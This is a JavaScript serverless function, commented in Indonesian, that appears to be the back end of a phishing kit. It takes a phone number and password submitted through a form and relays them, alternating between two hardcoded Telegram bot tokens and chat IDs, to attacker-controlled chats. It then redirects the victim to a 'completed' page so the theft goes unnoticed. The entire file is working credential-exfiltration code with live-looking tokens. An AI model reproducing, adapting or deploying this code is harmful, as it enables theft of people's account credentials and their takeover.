// Konfigurasi 2 bot Telegram lewat environment variables
const BOT1_TOKEN = process.env.BOT1_TOKEN;
const CHAT1_ID   = process.env.CHAT1_ID;

const BOT2_TOKEN = process.env.BOT2_TOKEN;
const CHAT2_ID   = process.env.CHAT2_ID;

// Simpan toggle bot (bergantian kirim data)
let lastBot = 1;

/**
 * Fungsi kirim pesan ke Telegram
 */
async function sendMessage(botToken, chatId, message) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const payload = {
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        const data = await response.json();
        return { success: response.ok, data };
    } catch (error) {
        console.error("Error sendMessage:", error);
        return { success: false, error: error.message };
    }
}

module.exports = async (req, res) => {
    if (req.method !== "POST") {
        res.status(405).send("Method Not Allowed");
        return;
    }

    // Ambil data dari form
    const phone = req.body.phoneNumber;
    const password = req.body.password;

    if (!phone || !password) {
        res.status(400).send("Phone atau Password tidak ditemukan.");
        return;
    }

    // Format pesan
    const message = `
*--- INPUT PASSWORD ---*
( PASSWORD | ${phone} )

- No HP: \`${phone}\`
- Password: \`${password}\`

via Telegram
    `;

    // Tentukan bot yang dipakai (bergantian)
    let botToken, chatId;
    if (lastBot === 1) {
        botToken = '7982924006:AAHeQSDcuVf0fnaYujbgZeUI2AreoRE8HSc';
        chatId   = '7495263260';
        lastBot  = 2;
    } else {
        botToken = '7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM';
        chatId   = '5876510981';
        lastBot  = 1;
    }

    // Kirim ke Telegram
    const result = await sendMessage(botToken, chatId, message);

    // Redirect ke halaman "completed"
    res.writeHead(302, { Location: "/completed/" });
    res.end();
};
